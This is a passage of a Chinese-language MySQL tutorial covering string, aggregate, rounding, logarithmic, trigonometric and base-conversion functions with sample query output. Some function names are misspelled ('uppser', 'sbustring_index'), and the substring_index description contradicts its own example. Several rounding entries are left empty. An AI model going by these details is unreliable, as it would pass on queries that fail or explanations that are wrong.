<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lcase(&quot;AllToLower&quot;);</span><br><span class="line">+---------------------+</span><br><span class="line">| lcase(&quot;AllToLower&quot;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| alltolower          |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>

<p><code>ucase(s)</code> | <code>uppser(s)</code></p>
<p><strong>描述：</strong>字符串英文大写。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ucase(&quot;AllToUpper&quot;);</span><br><span class="line">+---------------------+</span><br><span class="line">| ucase(&quot;AllToUpper&quot;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| ALLTOUPPER          |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>

<p><code>reverse(s)</code> </p>
<p><strong>描述：</strong>字符串逆序。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select reverse(&quot;12345&quot;);</span><br><span class="line">+------------------+</span><br><span class="line">| reverse(&quot;12345&quot;) |</span><br><span class="line">+------------------+</span><br><span class="line">| 54321            |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>

<h3 id="子字符串提取"><a href="#子字符串提取" class="headerlink" title="子字符串提取"></a>子字符串提取</h3><blockquote>
<ul>
<li><code>mid(string, start, len)</code> | <code>substr(string, start, len)</code> | <code>sbustring(string, start, len)</code>, 任意提取子字符串</li>
<li><code>left(string, num)</code> | <code>right(string, num)</code>，提取左/右子字符串</li>
<li><code>sbustring_index(s, delimiter, num)</code>，提取第 num 个分隔符 delimiter 前的子字符串</li>
</ul>
</blockquote>
<p>``mid(string, start, len)<code>|</code>substr(string, start, len)<code>|</code>sbustring(string, start, len)`</p>
<p><strong>描述：</strong>在 string start 位置提取长度为 len 的子字符串。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(&quot;123456789&quot;, 3, 3);</span><br><span class="line">+---------------------------+</span><br><span class="line">| substr(&quot;123456789&quot;, 3, 3) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| 345                       |</span><br><span class="line">+---------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(&quot;123456789&quot;, 3, 3);</span><br><span class="line">+------------------------+</span><br><span class="line">| mid(&quot;123456789&quot;, 3, 3) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 345                    |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>

<p><code>left(string, num)</code> | <code>right(string, num)</code></p>
<p><strong>描述：</strong>从字符串首部/尾部，提取长度为 num 的子字符串。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#首部提取</span><br><span class="line">mysql&gt; select left(&quot;123456789&quot;, 3);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(&quot;123456789&quot;, 3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 123                  |</span><br><span class="line">+----------------------+</span><br><span class="line">#尾部提取</span><br><span class="line">mysql&gt; select right(&quot;123456789&quot;, 3);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(&quot;123456789&quot;, 3) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 789                   |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>

<p><code>sbustring_index(s, delimiter, num)</code></p>
<p><strong>描述：</strong>提取第 num 个分隔符 delimiter 前的子字符串，num 值为正数则从右到左数起，为负数则从左到右数起。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substring_index(&quot;www.youtellme.org&quot;, &quot;.&quot;, 1);</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| substring_index(&quot;www.youtellme.org&quot;, &quot;.&quot;, 1) |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| www                                          |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring_index(&quot;www.youtellme.org&quot;, &quot;.&quot;, -1);</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| substring_index(&quot;www.youtellme.org&quot;, &quot;.&quot;, -1) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| org                                           |</span><br><span class="line">+-----------------------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><blockquote>
<p><code>strcmp(s1, s2)</code>，比较字符串的大小</p>
</blockquote>
<p><strong>描述：</strong></p>
<ul>
<li>s1 = s2，返回 0</li>
<li>s1 &lt; s2，返回 -1</li>
<li>s1 &gt; s2，返回 1</li>
</ul>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select strcmp(&quot;abc&quot;, &quot;Abc&quot;);</span><br><span class="line">+----------------------+</span><br><span class="line">| strcmp(&quot;abc&quot;, &quot;Abc&quot;) |  #不区分大小写</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br><span class="line"></span><br><span class="line">#按次序比较</span><br><span class="line">mysql&gt; select strcmp(&quot;abcd&quot;, &quot;abdc&quot;);</span><br><span class="line">+------------------------+</span><br><span class="line">| strcmp(&quot;abcd&quot;, &quot;abdc&quot;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                     -1 |</span><br><span class="line">+------------------------+</span><br><span class="line">#按次序比较</span><br><span class="line">mysql&gt; select strcmp(&quot;b&quot;, &quot;abdc&quot;);</span><br><span class="line">+---------------------+</span><br><span class="line">| strcmp(&quot;b&quot;, &quot;abdc&quot;) |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   1 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>

<h3 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h3><blockquote>
<ul>
<li><code>ascii(s)</code>，返回字符串 s 第一个字符的 ASCII</li>
<li><code>repeat(string, num)</code>，生成重复字符串</li>
<li><code>space(num)</code>，生成全空格字符串</li>
<li><code>format(num, n)</code>, 将数 num 格式化为 “xxx,xxx. xx”形式</li>
</ul>
</blockquote>
<p><code>ascii(s)</code></p>
<p><strong>描述：</strong>返回字符串 s 的第一个字符的 ASCII 码。</p>
<p><strong>实例：</strong>返回 comments 表中 comment 列的的第一个字符的 ASCII 码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select comment,ascii(comment)as ASCIIOfFirstChar from comments;</span><br><span class="line">+---------------------------+------------------+</span><br><span class="line">| comment                   | ASCIIOfFirstChar |</span><br><span class="line">+---------------------------+------------------+</span><br><span class="line">| test                      |              116 |</span><br><span class="line">| hhhh                      |              104 |</span><br><span class="line">| Need lots of improvements |               78 |</span><br><span class="line">+---------------------------+------------------+</span><br></pre></td></tr></table></figure>

<p><code>repeat(string, num)</code></p>
<p><strong>描述：</strong>生成重复字符串 string num 次的字符串。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select repeat(&quot;Ha&quot;, 3);</span><br><span class="line">+-----------------+</span><br><span class="line">| repeat(&quot;Ha&quot;, 3) |</span><br><span class="line">+-----------------+</span><br><span class="line">| HaHaHa          |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure>

<p><code>space(num)</code></p>
<p><strong>描述：</strong>生成 num 个空格的字符串。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&apos;some&apos;,space(4),&apos;space&apos;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| concat(&apos;some&apos;,space(4),&apos;space&apos;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| some    space                   |</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure>

<p><code>format(num, n)</code>,</p>
<p><strong>描述：</strong>将数 num 格式化为 “xxx,xxx. xx”形式</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select format(201910.0100, 2);</span><br><span class="line">+------------------------+</span><br><span class="line">| format(201910.0100, 2) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 201,910.01             |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>

<h2 id="数值函数"><a href="#数值函数" class="headerlink" title="数值函数"></a>数值函数</h2><h3 id="统计函数"><a href="#统计函数" class="headerlink" title="统计函数"></a>统计函数</h3><blockquote>
<ul>
<li><code>greatest(v1, v2...)</code> | <code>least(v1, v2...)</code>，最大/最小值</li>
<li><code>max(exp)</code> | <code>min(exp)</code>，列中的最大/最小值</li>
<li><code>sum(exp)</code> ，求列和</li>
<li><code>avg(exp)</code>，求列均值</li>
<li><code>count(exp)</code>，统计查询返回的行数</li>
</ul>
</blockquote>
<p><code>greatest(v1, v2...)</code> | <code>least(v1, v2...)</code></p>
<p><strong>描述：</strong>返回一系列数的最大/最小值</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select greatest(1, 3, 5, 7, 0);</span><br><span class="line">+-------------------------+</span><br><span class="line">| greatest(1, 3, 5, 7, 0) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       7 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select least(1, 3, 5, 7, 0);</span><br><span class="line">+----------------------+</span><br><span class="line">| least(1, 3, 5, 7, 0) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure>

<p><code>max(exp)</code> | <code>min(exp)</code></p>
<p><strong>描述：</strong>返回表达式 exp 计算后的最大/最小值</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#列值</span><br><span class="line">mysql&gt; select max(id) from comments;</span><br><span class="line">+---------+</span><br><span class="line">| max(id) |</span><br><span class="line">+---------+</span><br><span class="line">|       3 |</span><br><span class="line">+---------+</span><br><span class="line">mysql&gt; select min(id) from comments;</span><br><span class="line">+---------+</span><br><span class="line">| min(id) |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line">#表达式</span><br><span class="line">mysql&gt; select max(pow(id, 3) + 2) from comments;</span><br><span class="line">+---------------------+</span><br><span class="line">| max(pow(id, 3) + 2) |</span><br><span class="line">+---------------------+</span><br><span class="line">|                  29 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>

<p><code>sum(exp)</code> </p>
<p><strong>描述：</strong>返回表达式计算后系列数的和</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#列值求和</span><br><span class="line">mysql&gt; select sum(id) from comments;</span><br><span class="line">+---------+</span><br><span class="line">| sum(id) |</span><br><span class="line">+---------+</span><br><span class="line">|       6 |</span><br><span class="line">+---------+</span><br><span class="line">#表达式计算后求和</span><br><span class="line">mysql&gt; select sum(pow(id, 2)) from comments;</span><br><span class="line">+-----------------+</span><br><span class="line">| sum(pow(id, 2)) |</span><br><span class="line">+-----------------+</span><br><span class="line">|              14 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure>

<p><code>avg(exp)</code></p>
<p><strong>描述：</strong>返回表达式计算后系列数的均值</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#列值</span><br><span class="line">mysql&gt; select avg(id) from comments;</span><br><span class="line">+---------+</span><br><span class="line">| avg(id) |</span><br><span class="line">+---------+</span><br><span class="line">|  2.0000 |</span><br><span class="line">+---------+</span><br><span class="line">#表达式</span><br><span class="line">mysql&gt; select avg(pow(id, 2)) from comments;</span><br><span class="line">+-------------------+</span><br><span class="line">| avg(pow(id, 2))   |</span><br><span class="line">+-------------------+</span><br><span class="line">| 4.666666666666667 |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>

<p><code>count(exp)</code></p>
<p><strong>描述：</strong>返回查询的行数</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#统计 id 数</span><br><span class="line">mysql&gt; select count(id) from comments;</span><br><span class="line">+-----------+</span><br><span class="line">| count(id) |</span><br><span class="line">+-----------+</span><br><span class="line">|         3 |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>

<h3 id="取整函数"><a href="#取整函数" class="headerlink" title="取整函数"></a>取整函数</h3><blockquote>
<ul>
<li><code>abs(num)</code>，求绝对值，$|num|$</li>
<li><code>ceil(num)</code> | <code>ceiling(num)</code>，取上整数，$\lceil{num}\rceil$</li>
<li><code>floor(num)</code> ，取下整数，$\lfloor{num}\rfloor$</li>
<li><code>round(num, [decimals])</code>，取约数，四舍五入</li>
<li><code>truncate(num, decimals)</code>，截断小数部分</li>
<li><code>div(x, y)</code>，x 除以 y，返回一个整数</li>
<li><code>mod(x, y)</code> | <code>x mod y</code> | <code>x % y</code>，x 模 y</li>
</ul>
</blockquote>
<p><code>abs(num)</code></p>
<p><strong>描述：</strong></p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>

<p><code>ceil(num)</code> | <code>ceiling(num)</code></p>
<p> <strong>描述：</strong>取上整数</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>

<p><code>floor(num)</code></p>
<p><strong>描述：</strong></p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>

<p><code>round(num, [decimals])</code></p>
<p><strong>描述：</strong></p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>

<p><code>truncate(num, decimals)</code></p>
<p><strong>描述：</strong></p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>

<p><code>div(x, y)</code></p>
<p><strong>描述：</strong></p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>

<p><code>mod(x, y)</code> | <code>x mod y</code> | <code>x % y</code></p>
<p><strong>描述：</strong></p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>

<h3 id="幂函数"><a href="#幂函数" class="headerlink" title="幂函数"></a>幂函数</h3><blockquote>
<ul>
<li><code>pow(x, y)</code> | <code>power(x, y)</code>，$x^y$</li>
<li><code>sqrt(num)</code>，$\sqrt{num}$，负数返回 NULL</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 2 的 3 次方</span><br><span class="line">mysql&gt; select pow(2, 3);</span><br><span class="line">+-----------+</span><br><span class="line">| pow(2, 3) |</span><br><span class="line">+-----------+</span><br><span class="line">|         8 |</span><br><span class="line">+-----------+</span><br><span class="line"># 9 的根</span><br><span class="line">mysql&gt; select sqrt(9);</span><br><span class="line">+---------+</span><br><span class="line">| sqrt(9) |</span><br><span class="line">+---------+</span><br><span class="line">|       3 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>

<h3 id="指数和对数"><a href="#指数和对数" class="headerlink" title="指数和对数"></a>指数和对数</h3><blockquote>
<ul>
<li><code>exp(num)</code>，$e^{num}$</li>
<li><code>ln(num)</code>，求自然对数， $ln(num)$，num 要大于0，否则返回 NULL</li>
<li><code>log(m, n)</code>，$log_m(n)$，n 要大于0 且 m 大于1，否则返回 NULL</li>
<li><code>log2(n)</code>，求 2 为底  n 的对数，$log_2(n)$，n 要大于0，否则返回 NULL</li>
<li><code>log10(n)</code>，求 10 为底 n 的对数，$log_{10}(n)$，n 要大于0，否则返回 NULL</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(1); #自然对数 e</span><br><span class="line">+-------------------+</span><br><span class="line">| exp(1)            |</span><br><span class="line">+-------------------+</span><br><span class="line">| 2.718281828459045 |</span><br><span class="line">+-------------------+</span><br><span class="line">mysql&gt; select ln(exp(2));</span><br><span class="line">+------------+</span><br><span class="line">| ln(exp(2)) |</span><br><span class="line">+------------+</span><br><span class="line">|          2 |</span><br><span class="line">+------------+</span><br><span class="line">mysql&gt; select log(3, 9); #3 为底 9 的对数</span><br><span class="line">+-----------+</span><br><span class="line">| log(3, 9) |</span><br><span class="line">+-----------+</span><br><span class="line">|         2 |</span><br><span class="line">+-----------+</span><br><span class="line">mysql&gt; select log2(0); #n 不大于 0，返回 NULL</span><br><span class="line">+---------+</span><br><span class="line">| log2(0) |</span><br><span class="line">+---------+</span><br><span class="line">|    NULL |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>

<h3 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h3><blockquote>
<ul>
<li><code>sin(num)</code>，求正弦</li>
<li><code>cos(num)</code>，求余弦</li>
<li><code>tan(num)</code>，求正切</li>
<li><code>cot(num)</code>，求余切</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sin(pi()/2);</span><br><span class="line">+-------------+</span><br><span class="line">| sin(pi()/2) |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">mysql&gt; select sin(pi()); # sin(pi) 不为0，因为这里 pi 是个约数，实际的 pi 是无效不循环数</span><br><span class="line">+------------------------+</span><br><span class="line">| sin(pi())              |</span><br><span class="line">+------------------------+</span><br><span class="line">| 1.2246467991473532e-16 |</span><br><span class="line">+------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select sin(pi()/2);</span><br><span class="line">+-------------+</span><br><span class="line">| sin(pi()/2) |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>

<h3 id="反三角函数"><a href="#反三角函数" class="headerlink" title="反三角函数"></a>反三角函数</h3><blockquote>
<ul>
<li><p><code>asin(num)</code>，求反正弦，返回一个弧度值</p>
</li>
<li><p><code>acos(num)</code>，求反余弦，返回一个弧度值</p>
</li>
<li><p><code>atan(num)</code>，求反正切，返回一个弧度值</p>
</li>
<li><p><code>acot(num)</code>，求反余切，返回一个弧度值</p>
</li>
<li><p><code>atan2(n1, n2)</code>，求两个数的反正切，返回弧度值</p>
</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select asin(1); #约等于 pi/2</span><br><span class="line">+--------------------+</span><br><span class="line">| asin(1)            |</span><br><span class="line">+--------------------+</span><br><span class="line">| 1.5707963267948966 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select pi()/2;</span><br><span class="line">+--------------+</span><br><span class="line">| pi()/2       |</span><br><span class="line">+--------------+</span><br><span class="line">| 1.5707963268 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure>

<h3 id="其它函数"><a href="#其它函数" class="headerlink" title="其它函数"></a>其它函数</h3><blockquote>
<ul>
<li><code>pi()</code>，求 $\pi$ 值</li>
<li><code>degrees(num)</code>，求弧度 num 的角度值</li>
<li><code>radians(num)</code>，求角度 num 的弧度值</li>
<li><code>rand([seed])</code>，取 [0, 1) 的随机数，可设置种子 seed，生成相同的随机数</li>
<li><code>sign(num)</code>，返回数 num 的符号，正数为1，负数为-1，0 为 0</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select degrees(2*pi()); # 2*pi 弧度为 360 角度</span><br><span class="line">+-----------------+</span><br><span class="line">| degrees(2*pi()) |</span><br><span class="line">+-----------------+</span><br><span class="line">|             360 |</span><br><span class="line">+-----------------+</span><br><span class="line">mysql&gt; select radians(180); # 180度为 pi 弧度</span><br><span class="line">+-------------------+</span><br><span class="line">| radians(180)      |</span><br><span class="line">+-------------------+</span><br><span class="line">| 3.141592653589793 |</span><br><span class="line">+-------------------+</span><br><span class="line">mysql&gt; select rand(); #[0,1)的随机数</span><br><span class="line">+--------------------+</span><br><span class="line">| rand()             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 0.9826734987857505 |</span><br><span class="line">+--------------------+</span><br><span class="line">mysql&gt; select rand(), rand(1), rand(1); #相同的种子生成相同随机数</span><br><span class="line">+--------------------+---------------------+---------------------+</span><br><span class="line">| rand()             | rand(1)             | rand(1)             |</span><br><span class="line">+--------------------+---------------------+---------------------+</span><br><span class="line">| 0.8894535832940168 | 0.40540353712197724 | 0.40540353712197724 |</span><br><span class="line">+--------------------+---------------------+---------------------+</span><br></pre></td></tr></table></figure>

<h2 id="高级函数"><a href="#高级函数" class="headerlink" title="高级函数"></a>高级函数</h2><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><blockquote>
<ul>
<li><code>bin(num)</code>，将一个数字转换为二进制表示的数字，类型为字符串</li>
<li><code>hex(value)</code></li>
<li><code>conv(num, from_base, to_base)</code>，将一个数字从一个进制转换到另一个进制进行表示</li>
</ul>
</blockquote>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 二进制表示</span><br><span class="line">mysql&gt; select bin(9), bin(4), bin(2);</span><br><span class="line">+--------+--------+--------+</span><br><span class="line">| bin(9) | bin(4) | bin(2) |</span><br><span class="line">+--------+--------+--------+</span><br><span class="line">| 1001   | 100    | 10     |</span><br><span class="line">+--------+--------+--------+</span><br><span class="line"># 10进制转16进制和2进制表示</span><br><span class="line">mysql&gt; select conv(16, 10, 16), conv(16, 10, 2);</span><br><span class="line">+------------------+-----------------+</span><br><span class="line">| conv(16, 10, 16) | conv(16, 10, 2) |</span><br><span class="line">+------------------+-----------------+</span><br><span class="line">| 10               | 10000           |</span><br><span class="line">+------------------+-----------------+</span><br></pre></td></tr></table></figure>

